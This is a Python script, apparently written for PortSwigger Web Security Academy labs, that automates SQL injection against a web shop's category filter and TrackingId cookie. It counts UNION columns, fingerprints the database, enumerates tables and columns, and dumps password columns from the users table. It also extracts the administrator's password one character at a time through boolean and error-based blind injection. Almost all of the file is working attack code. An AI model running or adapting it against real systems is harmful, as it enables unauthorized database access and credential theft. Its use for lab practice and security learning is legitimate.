from collections import deque

import requests
import re
import string
import time

# Static variable should be arguments
# Error messages should be toggable
# Option for column count only

URL = 'https://0a52007e04c653058083099200120093.web-security-academy.net/filter'
TIMEOUT = 10
COL_DATA = 'test' # should be changed to data type for testing various types of columns.
COLUMNS = ['password', 'password_wzonzz', 'email']
TABLE = 'users'
CONDITION_COLUMN = 'username'
CONDITION_VALUE = 'administrator'
DATABASE = 'Oracle'
DATABASES = ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle'] # should be modified to include database variations.
ATTRIBUTE = 'category'
ATTR_VALUE = 'Gifts'
COOKIE_NAME = 'TrackingId'
DELAY = 2

#These static variables are not to be arguments
ALPHANUMERIC = list(string.ascii_lowercase + string.digits)

def check_columns(url, timeout=5):
    response_status = False
    payload = '\' UNION SELECT NULL--'
    num_columns = 0

    while not response_status:
        data = {'category': 'Lifestyl' + payload} # to be modified as a command line argument
        response = requests.get(url, params=data, timeout=timeout)

        if response.status_code is not requests.codes.ok:
            #print(f'Error Message: {response.text}')
            #print(f'Submitted Headers: {response.request.headers}')
            print(f'Payload Failed: {data}')
            payload = payload[:-2] + ', NULL-- '
        else:
            print(f'Payload Successful: {data}')
            num_columns = len(re.findall('NULL', payload))
            print(f'Number of columns: {num_columns}')
            response_status = True
        
    return num_columns

def find_num_dtype_columns(url, timeout, col_data): # if statement for data type to be added.
    num_nulls = 'NULL, ' * check_columns(URL, TIMEOUT)
    payload = '\' UNION SELECT ' + num_nulls
    payload = payload[:-2] + '-- '
    successful_columns = list()

    for index, null in enumerate(re.finditer('NULL', payload)):
        test_payload = payload[:null.start()] + '\'' + col_data + '\'' + payload[null.end():]
        data = {'category': 'Pet' + test_payload}
        response = requests.get(url, params=data, timeout=timeout)

        if response.status_code is not requests.codes.ok:
            #print(f'Error Message: {response.text}')
            #print(f'Submitted Headers: {response.headers}')
            print(f'Payload Failed: {data}')
        else:
            successful_columns.append(index)
            print(f'Payload Successful: {data}')
            print(f'{col_data} was successful in column number {index + 1}')
    
    return successful_columns, payload

def dump_data(url, columns, table, timeout=5):
    dtype_columns, payload = find_num_dtype_columns(URL, TIMEOUT, COL_DATA)
    test_columns = deque(columns)
    #test_payload = payload[:-3] + table + '-- '
    nulls = list(re.finditer('NULL', payload))
    successful_columns = []

    while test_columns:
        test_column = test_columns[0]
        test_payload = payload[:-3] + ' FROM ' + table + '-- '
        null = nulls[dtype_columns[0]]
        test_payload = test_payload[:null.start()] + test_columns.popleft() + test_payload[null.end():]

        data = {'category': 'Pet' + test_payload}
        response = requests.get(url, params=data, timeout=timeout)

        if response.status_code is requests.codes.ok:
            successful_columns.append(test_column)
        else:
            #print(response.text) # error messages should be toggable
            print(response.request.url)
            print(response.status_code)
        
        if not test_columns:
            if successful_columns:
                final_payload = payload[:-3] + ' FROM ' + table + '-- '
                print('Successful Columns: ' + ', '.join(successful_columns))
                combined_columns = ''

                for successful_column in successful_columns:
                    if successful_column is not successful_columns[-1]:
                        combined_columns += successful_column + ', \' \','
                    else:
                        combined_columns += successful_column

                final_payload = final_payload[:null.start()] + f'CONCAT({combined_columns})' + final_payload[null.end():]   
                final_data = {'category': 'Pet' + final_payload}
                final_response = requests.get(url, params=final_data)

                print(final_response.text)
                print(final_response.request.url)
                print(final_payload)
            else:
                print('None of the provided columns were successful.')


def find_database_version(url, attribute, attr_value, col_data, timeout=5):
    if sqli_test(url, attribute, attr_value, timeout):
        columns, payload = find_num_dtype_columns(url, timeout, col_data)
        nulls = list(re.finditer('NULL', payload))

        for database in DATABASES:
            test_payload = ''

            if database == 'MySQL' or database == 'MSSQL':
                test_payload = payload[:nulls[columns[0]].start()] + '@@version' + payload[nulls[columns[0]].end():]

            elif database == 'PostgreSQL':
                test_payload = payload[:nulls[columns[0]].start()] + 'version()' + payload[nulls[columns[0]].end():]

            elif database == 'Oracle':
                test_payload = payload[:nulls[columns[0]].start()] + 'banner' + payload[nulls[columns[0]].end():]
                test_payload = test_payload[:-2] + ' FROM v$version--'

            response = requests.get(url, params={attribute: attr_value + test_payload})

            if response.status_code is requests.codes.ok:
                print(response.text)
                print(test_payload)
                print('Payload was successful. The database is ' + database)
                return database, payload, columns
            else:
                #print(response.text)
                print(test_payload)
                print(f'Payload failed. Error code: {response.status_code}')
    else:
        print('Cannot determine database type')

def sqli_test(url, attribute, attr_value, timeout=5):
    response = requests.get(url, params={attribute: attr_value + '\' OR 1=1-- '}, timeout=timeout)
    
    if response.status_code == requests.codes.ok:
        print('SQLi test was successful.')
        return True
    
    print('SQLi test failed.')
    return False
    
def get_database_tables(url, attribute, attr_value, col_data, timeout=5):
    database, payload, columns = find_database_version(url, attribute, attr_value, col_data, timeout)

    if database:
        nulls = list(re.finditer('NULL', payload))
        test_payload = payload[:nulls[columns[0]].start()] + 'table_name' + payload[nulls[columns[0]].end():]

        if database != 'Oracle':
            test_payload = test_payload[:-3] + ' FROM information_schema.tables-- '
        else:
            test_payload = test_payload[:-3] + ' FROM all_tables--'
            
        response = requests.get(url, params={attribute: attr_value + test_payload})

        if response.status_code is requests.codes.ok:
            print(response.text)
            print(test_payload)
            print('Payload was successful.')
        else:
            print(response.text)
            print(test_payload)
            print('Payload was unsuccessful. Status Code: ' + str(response.status_code))
    else:
        print('Database cannot be found.')

def get_table_columns(url, attribute, attr_value, col_data, table_name, timeout=5):
    database, payload, columns = find_database_version(url, attribute, attr_value, col_data, timeout)

    if database:
        nulls = list(re.finditer('NULL', payload))
        test_payload = payload[:nulls[columns[0]].start()] + 'column_name' + payload[nulls[columns[0]].end():]

        if database != 'Oracle':
            test_payload = test_payload[:-3] + ' FROM information_schema.columns WHERE table_name = \'' + table_name + '\'-- '
        else:
            test_payload = test_payload[:-3] + ' FROM all_tab_columns WHERE table_name = \'' + table_name + '\'--'
            
        response = requests.get(url, params={attribute: attr_value + test_payload})

        if response.status_code is requests.codes.ok:
            print(response.text)
            print(test_payload)
            print('Payload was successful.')
        else:
            print(response.text)
            print(test_payload)
            print('Payload was unsuccessful. Status Code: ' + response.status_code)
    else:
        print('Database cannot be found.')

def cookie_bSQLi_attack(url, cookie_name, table, columns, condition_column, condition_value, database_type, timeout=5):
    initial_response = requests.get(url, timeout=timeout)
    cookie = initial_response.cookies[cookie_name]
    data = ''

    if cookie_bSQLi_test(url, cookie_name, cookie, timeout):
        function = 'SUBSTRING'

        if database_type == 'Oracle':
            database = 'SUBSTR'

        for index in range(1, 99):
            for character in ALPHANUMERIC:
                payload = f'\' AND {function}((SELECT {columns[0]} FROM {table} WHERE {condition_column} = \'{condition_value}\'), {index}, 1) = \'{character}'

                #time.sleep(DELAY)
                response = requests.get(url, cookies={cookie_name: cookie + payload}, timeout=timeout)

                if response.status_code == requests.codes.ok:
                    if response.content != initial_response.content:
                        data += character
                        print(f'Index position is {index} Current value of data is {data}')
                        break
                    elif  character == ALPHANUMERIC[-1]:
                        print('No more matching characters found.')
                        print(f'The value of {columns[0]} is {data}')
                        return data
                else:
                    print(f'Attack failed with status code {response.status_code} and payload: {payload}')
                    print(response.request._cookies)
                    return None
    else:
        print('Injection test failed.')

        
def cookie_bSQLi_test(url, cookie_name, cookie, timeout=5):
    #time.sleep(DELAY)
    initial_response = requests.get(url, cookies={cookie_name: cookie + '\' AND \'1\'=\'1'}, timeout=timeout)

    if initial_response.status_code == requests.codes.ok:
        #time.sleep(DELAY)
        second_response = requests.get(url, cookies={cookie_name: cookie + '\' AND \'1\'=\'2'}, timeout=timeout)

        if second_response.status_code == requests.codes.ok:
            if initial_response.content != second_response.content:
                print('Blind SQLi test was successful')
                return True
            else:
                print(initial_response.content)
                print(second_response.content)
                print(initial_response.request._cookies)
                print(second_response.request._cookies)
        else:
            print(f'Second request failed with a status code of {second_response.status_code}')
            print(second_response.request._cookies)
            return False
    else:
        print(f'Blind SQLi test using cookie - {cookie_name}: {cookie} failed with a status code of {initial_response.status_code}.')
        return False

def cookie_bSQLi_error_attack(url, cookie_name, table, columns, condition_column, condition_value, database_type, timeout=5):
    initial_response = requests.get(url, timeout=timeout)
    cookie = initial_response.cookies[cookie_name]
    data = ''

    bSQLi_error_test, bSQLi_error_test_status = cookie_bSQLi_error_test(url, cookie_name, cookie, timeout)

    if bSQLi_error_test:
        for index in range(1, 99):
            for character in ALPHANUMERIC:
                if database_type == 'Oracle':
                    payload = f'\' AND (SELECT CASE WHEN SUBSTR((SELECT {columns[0]} FROM {table} WHERE {condition_column} = \'{condition_value}\'), {index}, 1) = \'{character}\' THEN TO_CHAR(1/0) ELSE \'a\' END FROM dual)=\'a'
                elif database_type == 'MSSQL':
                    payload = f'\' AND (SELECT CASE WHEN SUBSTRING((SELECT {columns[0]} FROM {table} WHERE {condition_column} = \'{condition_value}\'), {index}, 1) = \'{character}\' THEN 1/0 ELSE \'a\' END)=\'a'
                elif database_type == 'PostgreSQL':
                    payload = f'\' AND (SELECT CASE WHEN SUBSTRING((SELECT {columns[0]} FROM {table} WHERE {condition_column} = \'{condition_value}\'), {index}, 1) = \'{character}\' THEN 1/(SELECT 0) ELSE \'a\' END)=\'a'
                elif database_type == 'MySQL':
                    payload = f'\' AND (SELECT IF(SUBSTRING((SELECT {columns[0]} FROM {table} WHERE {condition_column} = \'{condition_value}\'), {index}, 1) = \'{character}\', 1/0, \'a\'))=\'a'
                else:
                    print('database not found.')
                    return None

                #time.sleep(DELAY)
                response = requests.get(url, cookies={cookie_name: cookie + payload}, timeout=timeout)

                if response.status_code == bSQLi_error_test_status:
                    data += character
                    print(f'Index position is {index} Current value of data is {data}')
                    break
                elif  character == ALPHANUMERIC[-1]:
                    print('No more matching characters found.')
                    print(f'The value of {columns[0]} is {data}')
                    return data
    else:
        print('Blind SQL Injection error test failed.')

        
def cookie_bSQLi_error_test(url, cookie_name, cookie, timeout=5):
    #time.sleep(DELAY)
    initial_response = requests.get(url, cookies={cookie_name: cookie + '\' AND \'1\'=\'2'}, timeout=timeout)

    if initial_response.status_code == requests.codes.ok:
        #time.sleep(DELAY)
        second_response = requests.get(url, cookies={cookie_name: cookie + '\' AND \'1/0'}, timeout=timeout)

        if second_response.status_code >= 400:
            if initial_response.content != second_response.content:
                print(f'Blind SQLi error test was successful with status code {second_response.status_code} being returned.')
                return True, second_response.status_code
            else:
                print(initial_response.request._cookies)
                print(second_response.request._cookies)
        else:
            print(f'Failed to force an error. Status code {second_response.status_code} was returned.')
            print(second_response.request._cookies)
            return False, None
    else:
        print(f'Blind SQLi error test using cookie - {cookie_name}: {cookie} failed with a status code of {initial_response.status_code}.')
        return False, None
    

if __name__ == '__main__':
    #dump_data(URL, COLUMNS, TABLE, TIMEOUT)
    #find_num_dtype_columns(URL, TIMEOUT, COL_DATA)
    #get_database_tables(URL, ATTRIBUTE, ATTR_VALUE, COL_DATA, TIMEOUT)
    #get_table_columns(URL, ATTRIBUTE, ATTR_VALUE, COL_DATA, TABLE, TIMEOUT)
    #cookie_bSQLi_attack(URL, COOKIE_NAME, TABLE, COLUMNS, CONDITION_COLUMN, CONDITION_VALUE, DATABASE, TIMEOUT)
    cookie_bSQLi_error_attack(URL, COOKIE_NAME, TABLE, COLUMNS, CONDITION_COLUMN, CONDITION_VALUE, DATABASE, TIMEOUT)